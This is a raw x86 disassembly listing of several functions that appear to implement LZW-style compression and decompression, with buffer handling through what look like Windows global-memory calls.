  4064aa:	39 8d 84 ff fe ff    	cmp    %ecx,-0x1007c(%ebp)
  4064b0:	0f 83 b9 00 00 00    	jae    0x40656f
  4064b6:	81 bd bc ff fe ff 00 	cmpl   $0x10000,-0x10044(%ebp)
  4064bd:	00 01 00 
  4064c0:	7c 6c                	jl     0x40652e
  4064c2:	68 00 00 01 00       	push   $0x10000
  4064c7:	8d 95 c0 ff fe ff    	lea    -0x10040(%ebp),%edx
  4064cd:	52                   	push   %edx
  4064ce:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4064d1:	03 45 ec             	add    -0x14(%ebp),%eax
  4064d4:	50                   	push   %eax
  4064d5:	e8 78 14 00 00       	call   0x407952
  4064da:	83 c4 0c             	add    $0xc,%esp
  4064dd:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4064e0:	81 c1 00 00 01 00    	add    $0x10000,%ecx
  4064e6:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4064e9:	c7 85 bc ff fe ff 00 	movl   $0x0,-0x10044(%ebp)
  4064f0:	00 00 00 
  4064f3:	8b 95 b8 ff fe ff    	mov    -0x10048(%ebp),%edx
  4064f9:	52                   	push   %edx
  4064fa:	ff 15 18 90 40 00    	call   *0x409018
  406500:	6a 00                	push   $0x0
  406502:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406505:	05 00 00 01 00       	add    $0x10000,%eax
  40650a:	50                   	push   %eax
  40650b:	8b 8d b8 ff fe ff    	mov    -0x10048(%ebp),%ecx
  406511:	51                   	push   %ecx
  406512:	ff 15 14 90 40 00    	call   *0x409014
  406518:	89 85 b8 ff fe ff    	mov    %eax,-0x10048(%ebp)
  40651e:	8b 95 b8 ff fe ff    	mov    -0x10048(%ebp),%edx
  406524:	52                   	push   %edx
  406525:	ff 15 1c 90 40 00    	call   *0x40901c
  40652b:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40652e:	8b 85 bc ff fe ff    	mov    -0x10044(%ebp),%eax
  406534:	8b 8d 8c ff fe ff    	mov    -0x10074(%ebp),%ecx
  40653a:	8a 11                	mov    (%ecx),%dl
  40653c:	88 94 05 c0 ff fe ff 	mov    %dl,-0x10040(%ebp,%eax,1)
  406543:	8b 85 bc ff fe ff    	mov    -0x10044(%ebp),%eax
  406549:	83 c0 01             	add    $0x1,%eax
  40654c:	89 85 bc ff fe ff    	mov    %eax,-0x10044(%ebp)
  406552:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406555:	83 c1 01             	add    $0x1,%ecx
  406558:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40655b:	8b 95 8c ff fe ff    	mov    -0x10074(%ebp),%edx
  406561:	83 c2 01             	add    $0x1,%edx
  406564:	89 95 8c ff fe ff    	mov    %edx,-0x10074(%ebp)
  40656a:	e9 25 ff ff ff       	jmp    0x406494
  40656f:	0f b7 85 88 ff fe ff 	movzwl -0x10078(%ebp),%eax
  406576:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  40657c:	03 41 18             	add    0x18(%ecx),%eax
  40657f:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  406585:	89 42 18             	mov    %eax,0x18(%edx)
  406588:	8b 85 64 ff fe ff    	mov    -0x1009c(%ebp),%eax
  40658e:	81 78 1c 00 10 00 00 	cmpl   $0x1000,0x1c(%eax)
  406595:	7c 0a                	jl     0x4065a1
  406597:	c7 85 80 ff fe ff 00 	movl   $0x0,-0x10080(%ebp)
  40659e:	00 00 00 
  4065a1:	0f b7 4d cc          	movzwl -0x34(%ebp),%ecx
  4065a5:	83 c1 01             	add    $0x1,%ecx
  4065a8:	51                   	push   %ecx
  4065a9:	8b 55 c0             	mov    -0x40(%ebp),%edx
  4065ac:	83 c2 02             	add    $0x2,%edx
  4065af:	52                   	push   %edx
  4065b0:	8b 85 64 ff fe ff    	mov    -0x1009c(%ebp),%eax
  4065b6:	0f b7 48 1c          	movzwl 0x1c(%eax),%ecx
  4065ba:	51                   	push   %ecx
  4065bb:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  4065c1:	e8 da ed ff ff       	call   0x4053a0
  4065c6:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  4065cc:	8b 42 1c             	mov    0x1c(%edx),%eax
  4065cf:	83 c0 01             	add    $0x1,%eax
  4065d2:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  4065d8:	89 41 1c             	mov    %eax,0x1c(%ecx)
  4065db:	66 8b 95 b0 ff fe ff 	mov    -0x10050(%ebp),%dx
  4065e2:	66 89 55 f8          	mov    %dx,-0x8(%ebp)
  4065e6:	e9 08 f9 ff ff       	jmp    0x405ef3
  4065eb:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4065ee:	89 85 70 ff fe ff    	mov    %eax,-0x10090(%ebp)
  4065f4:	8b 8d 70 ff fe ff    	mov    -0x10090(%ebp),%ecx
  4065fa:	51                   	push   %ecx
  4065fb:	e8 4c 13 00 00       	call   0x40794c
  406600:	83 c4 04             	add    $0x4,%esp
  406603:	8b 55 c0             	mov    -0x40(%ebp),%edx
  406606:	89 95 6c ff fe ff    	mov    %edx,-0x10094(%ebp)
  40660c:	8b 85 6c ff fe ff    	mov    -0x10094(%ebp),%eax
  406612:	50                   	push   %eax
  406613:	e8 34 13 00 00       	call   0x40794c
  406618:	83 c4 04             	add    $0x4,%esp
  40661b:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40661e:	89 8d 68 ff fe ff    	mov    %ecx,-0x10098(%ebp)
  406624:	8b 95 68 ff fe ff    	mov    -0x10098(%ebp),%edx
  40662a:	52                   	push   %edx
  40662b:	e8 1c 13 00 00       	call   0x40794c
  406630:	83 c4 04             	add    $0x4,%esp
  406633:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406636:	3b 45 0c             	cmp    0xc(%ebp),%eax
  406639:	74 17                	je     0x406652
  40663b:	8b 8d b8 ff fe ff    	mov    -0x10048(%ebp),%ecx
  406641:	51                   	push   %ecx
  406642:	ff 15 10 90 40 00    	call   *0x409010
  406648:	c7 85 b8 ff fe ff 00 	movl   $0x0,-0x10048(%ebp)
  40664f:	00 00 00 
  406652:	83 bd bc ff fe ff 00 	cmpl   $0x0,-0x10044(%ebp)
  406659:	7e 1d                	jle    0x406678
  40665b:	8b 95 bc ff fe ff    	mov    -0x10044(%ebp),%edx
  406661:	52                   	push   %edx
  406662:	8d 85 c0 ff fe ff    	lea    -0x10040(%ebp),%eax
  406668:	50                   	push   %eax
  406669:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40666c:	03 4d ec             	add    -0x14(%ebp),%ecx
  40666f:	51                   	push   %ecx
  406670:	e8 dd 12 00 00       	call   0x407952
  406675:	83 c4 0c             	add    $0xc,%esp
  406678:	8b 95 b8 ff fe ff    	mov    -0x10048(%ebp),%edx
  40667e:	52                   	push   %edx
  40667f:	ff 15 18 90 40 00    	call   *0x409018
  406685:	6a 00                	push   $0x0
  406687:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40668a:	50                   	push   %eax
  40668b:	8b 8d b8 ff fe ff    	mov    -0x10048(%ebp),%ecx
  406691:	51                   	push   %ecx
  406692:	ff 15 14 90 40 00    	call   *0x409014
  406698:	89 85 b8 ff fe ff    	mov    %eax,-0x10048(%ebp)
  40669e:	8b 85 b8 ff fe ff    	mov    -0x10048(%ebp),%eax
  4066a4:	8b e5                	mov    %ebp,%esp
  4066a6:	5d                   	pop    %ebp
  4066a7:	c2 08 00             	ret    $0x8
  4066aa:	cc                   	int3
  4066ab:	cc                   	int3
  4066ac:	cc                   	int3
  4066ad:	cc                   	int3
  4066ae:	cc                   	int3
  4066af:	cc                   	int3
  4066b0:	55                   	push   %ebp
  4066b1:	8b ec                	mov    %esp,%ebp
  4066b3:	b8 50 00 01 00       	mov    $0x10050,%eax
  4066b8:	e8 63 12 00 00       	call   0x407920
  4066bd:	89 8d b0 ff fe ff    	mov    %ecx,-0x10050(%ebp)
  4066c3:	c7 45 dc 00 00 01 00 	movl   $0x10000,-0x24(%ebp)
  4066ca:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4066d1:	68 00 00 01 00       	push   $0x10000
  4066d6:	6a 42                	push   $0x42
  4066d8:	ff 15 20 90 40 00    	call   *0x409020
  4066de:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4066e1:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4066e5:	75 07                	jne    0x4066ee
  4066e7:	33 c0                	xor    %eax,%eax
  4066e9:	e9 92 04 00 00       	jmp    0x406b80
  4066ee:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4066f1:	50                   	push   %eax
  4066f2:	ff 15 1c 90 40 00    	call   *0x40901c
  4066f8:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4066fb:	68 00 00 01 00       	push   $0x10000
  406700:	6a 00                	push   $0x0
  406702:	8d 8d d0 ff fe ff    	lea    -0x10030(%ebp),%ecx
  406708:	51                   	push   %ecx
  406709:	e8 06 12 00 00       	call   0x407914
  40670e:	83 c4 0c             	add    $0xc,%esp
  406711:	c7 85 cc ff fe ff 00 	movl   $0x0,-0x10034(%ebp)
  406718:	00 00 00 
  40671b:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  406722:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  406729:	8b 95 b0 ff fe ff    	mov    -0x10050(%ebp),%edx
  40672f:	c7 42 24 00 00 00 00 	movl   $0x0,0x24(%edx)
  406736:	b8 00 04 00 00       	mov    $0x400,%eax
  40673b:	66 89 45 d4          	mov    %ax,-0x2c(%ebp)
  40673f:	b9 00 04 00 00       	mov    $0x400,%ecx
  406744:	66 89 4d d4          	mov    %cx,-0x2c(%ebp)
  406748:	0f b7 55 d4          	movzwl -0x2c(%ebp),%edx
  40674c:	89 55 e0             	mov    %edx,-0x20(%ebp)
  40674f:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  406756:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  40675c:	83 c1 04             	add    $0x4,%ecx
  40675f:	e8 3c ee ff ff       	call   0x4055a0
  406764:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406767:	8d 0c c5 40 00 00 00 	lea    0x40(,%eax,8),%ecx
  40676e:	51                   	push   %ecx
  40676f:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406775:	83 c1 18             	add    $0x18,%ecx
  406778:	e8 c3 f3 ff ff       	call   0x405b40
  40677d:	6a 09                	push   $0x9
  40677f:	68 00 01 00 00       	push   $0x100
  406784:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  40678a:	83 c1 18             	add    $0x18,%ecx
  40678d:	e8 5e f4 ff ff       	call   0x405bf0
  406792:	8b 95 b0 ff fe ff    	mov    -0x10050(%ebp),%edx
  406798:	83 c2 0c             	add    $0xc,%edx
  40679b:	89 55 d0             	mov    %edx,-0x30(%ebp)
  40679e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4067a5:	c7 85 c8 ff fe ff 00 	movl   $0x0,-0x10038(%ebp)
  4067ac:	00 00 00 
  4067af:	eb 0f                	jmp    0x4067c0
  4067b1:	8b 85 c8 ff fe ff    	mov    -0x10038(%ebp),%eax
  4067b7:	83 c0 01             	add    $0x1,%eax
  4067ba:	89 85 c8 ff fe ff    	mov    %eax,-0x10038(%ebp)
  4067c0:	8b 8d c8 ff fe ff    	mov    -0x10038(%ebp),%ecx
  4067c6:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  4067c9:	0f 83 15 02 00 00    	jae    0x4069e4
  4067cf:	8b 55 08             	mov    0x8(%ebp),%edx
  4067d2:	03 55 ec             	add    -0x14(%ebp),%edx
  4067d5:	8a 02                	mov    (%edx),%al
  4067d7:	88 45 e7             	mov    %al,-0x19(%ebp)
  4067da:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4067dd:	83 c1 01             	add    $0x1,%ecx
  4067e0:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4067e3:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4067e6:	52                   	push   %edx
  4067e7:	0f b6 45 e7          	movzbl -0x19(%ebp),%eax
  4067eb:	50                   	push   %eax
  4067ec:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  4067f2:	83 c1 04             	add    $0x4,%ecx
  4067f5:	e8 86 ee ff ff       	call   0x405680
  4067fa:	89 85 c4 ff fe ff    	mov    %eax,-0x1003c(%ebp)
  406800:	83 bd c4 ff fe ff 00 	cmpl   $0x0,-0x1003c(%ebp)
  406807:	74 0e                	je     0x406817
  406809:	8b 8d c4 ff fe ff    	mov    -0x1003c(%ebp),%ecx
  40680f:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  406812:	e9 bf 01 00 00       	jmp    0x4069d6
  406817:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  40681d:	e8 6e 03 00 00       	call   0x406b90
  406822:	89 45 e8             	mov    %eax,-0x18(%ebp)
  406825:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406828:	66 8b 42 02          	mov    0x2(%edx),%ax
  40682c:	66 89 85 c0 ff fe ff 	mov    %ax,-0x10040(%ebp)
  406833:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  406836:	51                   	push   %ecx
  406837:	0f b7 95 c0 ff fe ff 	movzwl -0x10040(%ebp),%edx
  40683e:	52                   	push   %edx
  40683f:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406845:	83 c1 18             	add    $0x18,%ecx
  406848:	e8 a3 f3 ff ff       	call   0x405bf0
  40684d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406850:	50                   	push   %eax
  406851:	0f b6 4d e7          	movzbl -0x19(%ebp),%ecx
  406855:	51                   	push   %ecx
  406856:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  40685c:	83 c1 04             	add    $0x4,%ecx
  40685f:	e8 6c ee ff ff       	call   0x4056d0
  406864:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  40686a:	83 c1 18             	add    $0x18,%ecx
  40686d:	e8 4e f4 ff ff       	call   0x405cc0
  406872:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  406875:	0f 86 e5 00 00 00    	jbe    0x406960
  40687b:	8b 95 b0 ff fe ff    	mov    -0x10050(%ebp),%edx
  406881:	8b 42 24             	mov    0x24(%edx),%eax
  406884:	03 45 e0             	add    -0x20(%ebp),%eax
  406887:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  40688d:	89 41 24             	mov    %eax,0x24(%ecx)
  406890:	8b 95 cc ff fe ff    	mov    -0x10034(%ebp),%edx
  406896:	03 55 e0             	add    -0x20(%ebp),%edx
  406899:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  40689f:	7c 63                	jl     0x406904
  4068a1:	8b 85 cc ff fe ff    	mov    -0x10034(%ebp),%eax
  4068a7:	50                   	push   %eax
  4068a8:	8d 8d d0 ff fe ff    	lea    -0x10030(%ebp),%ecx
  4068ae:	51                   	push   %ecx
  4068af:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4068b2:	03 55 f0             	add    -0x10(%ebp),%edx
  4068b5:	52                   	push   %edx
  4068b6:	e8 97 10 00 00       	call   0x407952
  4068bb:	83 c4 0c             	add    $0xc,%esp
  4068be:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4068c1:	03 85 cc ff fe ff    	add    -0x10034(%ebp),%eax
  4068c7:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4068ca:	c7 85 cc ff fe ff 00 	movl   $0x0,-0x10034(%ebp)
  4068d1:	00 00 00 
  4068d4:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4068d7:	51                   	push   %ecx
  4068d8:	ff 15 18 90 40 00    	call   *0x409018
  4068de:	6a 00                	push   $0x0
  4068e0:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4068e3:	81 c2 00 00 01 00    	add    $0x10000,%edx
  4068e9:	52                   	push   %edx
  4068ea:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4068ed:	50                   	push   %eax
  4068ee:	ff 15 14 90 40 00    	call   *0x409014
  4068f4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4068f7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4068fa:	51                   	push   %ecx
  4068fb:	ff 15 1c 90 40 00    	call   *0x40901c
  406901:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406904:	8b 95 b0 ff fe ff    	mov    -0x10050(%ebp),%edx
  40690a:	8b 42 18             	mov    0x18(%edx),%eax
  40690d:	89 85 bc ff fe ff    	mov    %eax,-0x10044(%ebp)
  406913:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406916:	51                   	push   %ecx
  406917:	8b 95 bc ff fe ff    	mov    -0x10044(%ebp),%edx
  40691d:	52                   	push   %edx
  40691e:	8b 85 cc ff fe ff    	mov    -0x10034(%ebp),%eax
  406924:	8d 8c 05 d0 ff fe ff 	lea    -0x10030(%ebp,%eax,1),%ecx
  40692b:	51                   	push   %ecx
  40692c:	e8 21 10 00 00       	call   0x407952
  406931:	83 c4 0c             	add    $0xc,%esp
  406934:	8b 95 cc ff fe ff    	mov    -0x10034(%ebp),%edx
  40693a:	03 55 e0             	add    -0x20(%ebp),%edx
  40693d:	89 95 cc ff fe ff    	mov    %edx,-0x10034(%ebp)
  406943:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406946:	03 45 e0             	add    -0x20(%ebp),%eax
  406949:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40694c:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40694f:	51                   	push   %ecx
  406950:	6a 00                	push   $0x0
  406952:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406958:	83 c1 18             	add    $0x18,%ecx
  40695b:	e8 a0 f3 ff ff       	call   0x405d00
  406960:	8b 95 b0 ff fe ff    	mov    -0x10050(%ebp),%edx
  406966:	8b 42 04             	mov    0x4(%edx),%eax
  406969:	89 85 b8 ff fe ff    	mov    %eax,-0x10048(%ebp)
  40696f:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406975:	0f b7 11             	movzwl (%ecx),%edx
  406978:	83 ea 03             	sub    $0x3,%edx
  40697b:	39 95 b8 ff fe ff    	cmp    %edx,-0x10048(%ebp)
  406981:	72 33                	jb     0x4069b6
  406983:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406989:	e8 02 02 00 00       	call   0x406b90
  40698e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  406991:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406994:	50                   	push   %eax
  406995:	68 00 01 00 00       	push   $0x100
  40699a:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  4069a0:	83 c1 18             	add    $0x18,%ecx
  4069a3:	e8 48 f2 ff ff       	call   0x405bf0
  4069a8:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  4069ae:	83 c1 04             	add    $0x4,%ecx
  4069b1:	e8 ea eb ff ff       	call   0x4055a0
  4069b6:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  4069bc:	83 c1 0c             	add    $0xc,%ecx
  4069bf:	51                   	push   %ecx
  4069c0:	0f b6 55 e7          	movzbl -0x19(%ebp),%edx
  4069c4:	52                   	push   %edx
  4069c5:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  4069cb:	83 c1 04             	add    $0x4,%ecx
  4069ce:	e8 ad ec ff ff       	call   0x405680
  4069d3:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4069d6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4069d9:	83 c0 01             	add    $0x1,%eax
  4069dc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4069df:	e9 cd fd ff ff       	jmp    0x4067b1
  4069e4:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  4069ea:	e8 a1 01 00 00       	call   0x406b90
  4069ef:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4069f2:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4069f5:	51                   	push   %ecx
  4069f6:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4069f9:	0f b7 42 02          	movzwl 0x2(%edx),%eax
  4069fd:	50                   	push   %eax
  4069fe:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406a04:	83 c1 18             	add    $0x18,%ecx
  406a07:	e8 e4 f1 ff ff       	call   0x405bf0
  406a0c:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406a12:	e8 79 01 00 00       	call   0x406b90
  406a17:	89 45 e8             	mov    %eax,-0x18(%ebp)
  406a1a:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  406a1d:	51                   	push   %ecx
  406a1e:	68 01 01 00 00       	push   $0x101
  406a23:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406a29:	83 c1 18             	add    $0x18,%ecx
  406a2c:	e8 bf f1 ff ff       	call   0x405bf0
  406a31:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406a37:	83 c1 18             	add    $0x18,%ecx
  406a3a:	e8 81 f2 ff ff       	call   0x405cc0
  406a3f:	8b 95 b0 ff fe ff    	mov    -0x10050(%ebp),%edx
  406a45:	03 42 24             	add    0x24(%edx),%eax
  406a48:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406a4e:	89 41 24             	mov    %eax,0x24(%ecx)
  406a51:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406a57:	83 c1 18             	add    $0x18,%ecx
  406a5a:	e8 61 f2 ff ff       	call   0x405cc0
  406a5f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406a62:	8b 95 cc ff fe ff    	mov    -0x10034(%ebp),%edx
  406a68:	03 55 e0             	add    -0x20(%ebp),%edx
  406a6b:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  406a71:	7c 63                	jl     0x406ad6
  406a73:	8b 85 cc ff fe ff    	mov    -0x10034(%ebp),%eax
  406a79:	50                   	push   %eax
  406a7a:	8d 8d d0 ff fe ff    	lea    -0x10030(%ebp),%ecx
  406a80:	51                   	push   %ecx
  406a81:	8b 55 d8             	mov    -0x28(%ebp),%edx
  406a84:	03 55 f0             	add    -0x10(%ebp),%edx
  406a87:	52                   	push   %edx
  406a88:	e8 c5 0e 00 00       	call   0x407952
  406a8d:	83 c4 0c             	add    $0xc,%esp
  406a90:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406a93:	03 85 cc ff fe ff    	add    -0x10034(%ebp),%eax
  406a99:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406a9c:	c7 85 cc ff fe ff 00 	movl   $0x0,-0x10034(%ebp)
  406aa3:	00 00 00 
  406aa6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406aa9:	51                   	push   %ecx
  406aaa:	ff 15 18 90 40 00    	call   *0x409018
  406ab0:	6a 00                	push   $0x0
  406ab2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406ab5:	81 c2 00 00 01 00    	add    $0x10000,%edx
  406abb:	52                   	push   %edx
  406abc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406abf:	50                   	push   %eax
  406ac0:	ff 15 14 90 40 00    	call   *0x409014
  406ac6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406ac9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406acc:	51                   	push   %ecx
  406acd:	ff 15 1c 90 40 00    	call   *0x40901c
  406ad3:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406ad6:	8b 95 b0 ff fe ff    	mov    -0x10050(%ebp),%edx
  406adc:	8b 42 18             	mov    0x18(%edx),%eax
  406adf:	89 85 b4 ff fe ff    	mov    %eax,-0x1004c(%ebp)
  406ae5:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406ae8:	51                   	push   %ecx
  406ae9:	8b 95 b4 ff fe ff    	mov    -0x1004c(%ebp),%edx
  406aef:	52                   	push   %edx
  406af0:	8b 85 cc ff fe ff    	mov    -0x10034(%ebp),%eax
  406af6:	8d 8c 05 d0 ff fe ff 	lea    -0x10030(%ebp,%eax,1),%ecx
  406afd:	51                   	push   %ecx
  406afe:	e8 4f 0e 00 00       	call   0x407952
  406b03:	83 c4 0c             	add    $0xc,%esp
  406b06:	8b 95 cc ff fe ff    	mov    -0x10034(%ebp),%edx
  406b0c:	03 55 e0             	add    -0x20(%ebp),%edx
  406b0f:	89 95 cc ff fe ff    	mov    %edx,-0x10034(%ebp)
  406b15:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406b18:	03 45 e0             	add    -0x20(%ebp),%eax
  406b1b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406b1e:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406b24:	83 c1 04             	add    $0x4,%ecx
  406b27:	e8 64 e9 ff ff       	call   0x405490
  406b2c:	8b 8d b0 ff fe ff    	mov    -0x10050(%ebp),%ecx
  406b32:	83 c1 18             	add    $0x18,%ecx
  406b35:	e8 76 f0 ff ff       	call   0x405bb0
  406b3a:	83 bd cc ff fe ff 00 	cmpl   $0x0,-0x10034(%ebp)
  406b41:	7e 1d                	jle    0x406b60
  406b43:	8b 8d cc ff fe ff    	mov    -0x10034(%ebp),%ecx
  406b49:	51                   	push   %ecx
  406b4a:	8d 95 d0 ff fe ff    	lea    -0x10030(%ebp),%edx
  406b50:	52                   	push   %edx
  406b51:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406b54:	03 45 f0             	add    -0x10(%ebp),%eax
  406b57:	50                   	push   %eax
  406b58:	e8 f5 0d 00 00       	call   0x407952
  406b5d:	83 c4 0c             	add    $0xc,%esp
  406b60:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406b63:	51                   	push   %ecx
  406b64:	ff 15 18 90 40 00    	call   *0x409018
  406b6a:	6a 00                	push   $0x0
  406b6c:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406b6f:	52                   	push   %edx
  406b70:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406b73:	50                   	push   %eax
  406b74:	ff 15 14 90 40 00    	call   *0x409014
  406b7a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406b7d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406b80:	8b e5                	mov    %ebp,%esp
  406b82:	5d                   	pop    %ebp
  406b83:	c2 08 00             	ret    $0x8
  406b86:	cc                   	int3
  406b87:	cc                   	int3
  406b88:	cc                   	int3
  406b89:	cc                   	int3
  406b8a:	cc                   	int3
  406b8b:	cc                   	int3
  406b8c:	cc                   	int3
  406b8d:	cc                   	int3
  406b8e:	cc                   	int3
  406b8f:	cc                   	int3
  406b90:	55                   	push   %ebp
  406b91:	8b ec                	mov    %esp,%ebp
  406b93:	83 ec 10             	sub    $0x10,%esp
  406b96:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406b99:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406b9c:	8b 48 04             	mov    0x4(%eax),%ecx
  406b9f:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  406ba2:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406ba5:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406ba8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406bab:	c1 f8 09             	sar    $0x9,%eax
  406bae:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406bb1:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  406bb8:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406bbc:	7e 13                	jle    0x406bd1
  406bbe:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406bc1:	d1 f9                	sar    $1,%ecx
  406bc3:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406bc6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406bc9:	83 c2 01             	add    $0x1,%edx
  406bcc:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406bcf:	eb e7                	jmp    0x406bb8
  406bd1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406bd4:	8b e5                	mov    %ebp,%esp
  406bd6:	5d                   	pop    %ebp
  406bd7:	c3                   	ret
  406bd8:	cc                   	int3
  406bd9:	cc                   	int3
  406bda:	cc                   	int3
  406bdb:	cc                   	int3
  406bdc:	cc                   	int3
  406bdd:	cc                   	int3
  406bde:	cc                   	int3
  406bdf:	cc                   	int3
  406be0:	55                   	push   %ebp
  406be1:	8b ec                	mov    %esp,%ebp
  406be3:	83 ec 38             	sub    $0x38,%esp
  406be6:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  406be9:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406bec:	e8 2f 01 00 00       	call   0x406d20
  406bf1:	8b 45 0c             	mov    0xc(%ebp),%eax
  406bf4:	50                   	push   %eax
  406bf5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406bf8:	51                   	push   %ecx
  406bf9:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406bfc:	e8 af fa ff ff       	call   0x4066b0
  406c01:	89 45 cc             	mov    %eax,-0x34(%ebp)
  406c04:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  406c07:	e8 14 ef ff ff       	call   0x405b20
  406c0c:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406c0f:	e8 5c e8 ff ff       	call   0x405470
